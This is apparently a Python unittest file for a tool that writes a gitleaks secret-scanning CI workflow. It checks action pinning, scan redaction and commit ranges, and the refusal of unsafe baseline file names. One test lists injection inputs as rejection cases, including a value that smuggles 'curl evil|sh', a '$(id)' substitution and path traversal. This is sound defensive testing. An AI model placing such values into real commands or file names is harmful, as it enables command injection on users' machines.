"""Tests of the secrets workflow template and its writer (SPEC-0024) on text, with no external tools."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent / "plugins" / "methodology" / "scripts"))

from mthlib import secretci  # noqa: E402
from mthlib.config import parse  # noqa: E402
from mthlib.errors import MthError  # noqa: E402
from test_secrets import BASE, install_fake  # noqa: E402

TEXT = secretci.TEMPLATE.read_text(encoding="utf-8")


class TemplateTests(unittest.TestCase):
    def test_triggers_permissions_and_pinned_pieces(self):
        # verifies: SPEC-0024/AC-09
        # verifies: SPEC-0024/FM-09
        self.assertTrue(TEXT.startswith(secretci.MARK))
        self.assertRegex(TEXT, r"(?m)^on:\n  pull_request:\n  push:\n    branches: \[main, development\]")
        self.assertRegex(TEXT, r"(?m)^permissions:\n  contents: read$")
        for use in re.findall(r"uses:\s*(\S+)", TEXT):  # every action pinned by a full commit SHA
            self.assertRegex(use, r"@[0-9a-f]{40}$", use)
        self.assertRegex(TEXT, r'VERSION: "\d+\.\d+\.\d+"')
        self.assertRegex(TEXT, r'SHA256: "[0-9a-f]{64}"')
        self.assertIn("sha256sum -c", TEXT)
        self.assertNotIn("gitleaks-action", TEXT)
        # verifies: SPEC-0024/FM-10
        for needle in ("--connect-timeout", "--max-time", "--retry 3", "timeout-minutes: 15"):
            self.assertIn(needle, TEXT)

    def test_scans_the_range_of_each_event_with_the_baseline(self):
        # verifies: SPEC-0024/AC-09
        for needle in ("--redact", "--exit-code 2", "--log-opts=", "--baseline-path", "PR_BASE", "PUSH_BEFORE",
                       "fetch-depth: 0", secretci.PLACEHOLDER):
            self.assertIn(needle, TEXT)


class ScanStepTests(unittest.TestCase):
    """The `Scan` step of the template run for real with a fake gitleaks (SPEC-0024/FM-11)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.tmp)
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
               "GIT_COMMITTER_EMAIL": "t@t"}
        self.run_in(["git", "init", "-q", "-b", "main"], env)
        (self.repo / "a.txt").write_text("a")
        self.run_in(["git", "add", "-A"], env)
        self.run_in(["git", "commit", "-q", "-m", "one"], env)
        self.head = self.run_in(["git", "rev-parse", "HEAD"], env).stdout.strip()
        shutil.copy(install_fake(self.tmp / "bin") / "gitleaks", self.repo / "gitleaks")
        block = TEXT.split("- name: Scan", 1)[1].split("run: |\n", 1)[1]
        self.script = self.tmp / "scan.sh"
        self.script.write_text("\n".join(line[10:] for line in block.splitlines()).replace(secretci.PLACEHOLDER, "b.json"))
        self.env = {**env, "FAKE_GITLEAKS_LOG": str(self.tmp / "calls.log"), "FAKE_GITLEAKS_MODE": "clean",
                    "FAKE_GITLEAKS_GITLOG": "1", "EVENT": "push", "PUSH_AFTER": self.head, "PR_BASE": "", "PR_HEAD": ""}

    def run_in(self, args, env):
        return subprocess.run(args, cwd=self.repo, env=env, capture_output=True, text=True, check=True)

    def scan(self, before: str) -> subprocess.CompletedProcess:
        return subprocess.run(["sh", str(self.script)], cwd=self.repo, env={**self.env, "PUSH_BEFORE": before},
                              capture_output=True, text=True)

    def test_a_push_whose_previous_commit_is_gone_fails_the_job(self):
        # verifies: SPEC-0024/FM-11
        self.assertNotEqual(self.scan("1" * 40).returncode, 0)
        self.assertEqual(self.scan(self.head).returncode, 0)
        self.assertEqual(self.scan("0" * 40).returncode, 0)  # a new branch: the whole history

    def test_the_scan_is_redacted_bounded_to_the_range_and_a_tool_failure_fails_the_job(self):
        # verifies: SPEC-0024/AC-09
        self.assertEqual(self.scan(self.head).returncode, 0)
        call = json.loads((self.tmp / "calls.log").read_text().splitlines()[-1])
        for flag in ("--redact", "--no-banner", "--exit-code", "2"):
            self.assertIn(flag, call)
        self.assertIn(f"--log-opts={self.head}..{self.head}", call)
        self.env["FAKE_GITLEAKS_MODE"] = "error"
        self.assertNotEqual(self.scan(self.head).returncode, 0)


class WriterTests(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.root)

    def test_writes_from_the_template_with_the_baseline_and_is_idempotent(self):
        # verifies: SPEC-0024/AC-10
        self.assertEqual(secretci.install(self.root, "cfg/.gitleaks-baseline.json"), "absent")
        written = (self.root / secretci.WORKFLOW).read_text()
        self.assertIn("baseline='cfg/.gitleaks-baseline.json'", written)
        self.assertNotIn(secretci.PLACEHOLDER, written)
        self.assertEqual(secretci.install(self.root, "cfg/.gitleaks-baseline.json"), "current")
        self.assertEqual(secretci.install(self.root, "other.json"), "stale")
        self.assertIn("baseline='other.json'", (self.root / secretci.WORKFLOW).read_text())

    def test_a_file_without_the_mark_is_never_overwritten(self):
        # verifies: SPEC-0024/AC-10
        # verifies: SPEC-0024/FM-06
        path = self.root / secretci.WORKFLOW
        path.parent.mkdir(parents=True)
        path.write_text("name: mine\n")
        self.assertEqual(secretci.state(self.root, "b.json"), "foreign")
        self.assertEqual(secretci.install(self.root, "b.json"), "foreign")
        self.assertEqual(path.read_text(), "name: mine\n")

    def test_an_unsafe_baseline_or_an_unreadable_file_is_reported_not_raised(self):
        # verifies: SPEC-0024/AC-11
        # verifies: SPEC-0024/FM-12
        path = self.root / secretci.WORKFLOW
        path.parent.mkdir(parents=True)
        path.write_text(secretci.render("ok.json"), encoding="utf-8")
        self.assertEqual(secretci.state(self.root, "bad name.json"), "invalid")
        self.assertEqual(secretci.install(self.root, "ok.json"), "current")
        path.chmod(0)
        try:
            if os.access(path, os.R_OK):  # running as root: the permission cannot be dropped
                self.skipTest("file permissions are not enforced")
            self.assertEqual(secretci.state(self.root, "ok.json"), "invalid")
        finally:
            path.chmod(0o644)

    def test_an_unsafe_baseline_fails_the_configuration_only_when_the_workflow_is_on(self):
        # verifies: SPEC-0024/AC-11
        # verifies: SPEC-0024/FM-12
        for ci, ok in (("on", False), ("off", True), ("", True)):
            body = f'[secrets]\nci = "{ci}"\nbaseline = "bad name.json"\n'
            if ok:
                parse(Path("."), BASE + body)
                continue
            with self.assertRaises(MthError) as ctx:
                parse(Path("."), BASE + body)
            self.assertIn("secrets.baseline", ctx.exception.message)

    def test_unsafe_baseline_is_refused_and_nothing_is_written(self):
        # verifies: SPEC-0024/AC-11
        # verifies: SPEC-0024/FM-07
        for value in ("a b.json", "x'; curl evil|sh; '", "$(id).json", "a\nb", "é.json", "", "-x.json", "a/../b.json", "../x"):
            with self.assertRaises(MthError, msg=value):
                secretci.install(self.root, value)
        self.assertFalse((self.root / ".github").exists())


if __name__ == "__main__":
    unittest.main()
